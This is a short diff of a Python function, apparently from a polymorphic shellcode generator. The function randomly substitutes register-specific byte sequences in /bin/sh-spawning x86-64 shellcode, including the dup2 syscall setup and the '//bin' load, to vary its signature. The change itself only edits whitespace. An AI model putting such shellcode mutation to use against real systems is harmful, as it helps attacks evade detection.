@@ -34,6 +34,7 @@ def regreplace(preshellcode: str) -> str:
     #sil 1 dict
     sil_1_dict = data["instructions"].get("sil_1")
     sil_1_keys = list(sil_1_dict.keys())
+    
     # mov reg rax dictionnary and its keys
     # all dictionaries have the same keys
     mov_reg_rax_dict = data["instructions"].get("mov_reg_rax")
@@ -76,8 +77,6 @@ def regreplace(preshellcode: str) -> str:
         if reg1 != reg2 and reg1 not in ['r11', 'r13', 'r14']:
             break
     
-    
-
     preshellcode = preshellcode.replace('b021', al_33_dict.get(randal))
     preshellcode = preshellcode.replace('40b702', dil_2_dict.get(randil))
     preshellcode = preshellcode.replace('40b601', sil_1_dict.get(randsil))
@@ -88,6 +87,7 @@ def regreplace(preshellcode: str) -> str:
     preshellcode = preshellcode.replace('49bf2f2f62696e', mov_reg_sh_dict.get(reg1))
     preshellcode = preshellcode.replace('4d31f6', xor_dict.get(reg2))
     preshellcode = preshellcode.replace('4156', push_dict.get(reg2))
+
     # return a dictionary that will hold the preshellcode modified and the two registry put
     # it will be use to remove them from oprand function to remove the reg choosed from xor operation
 
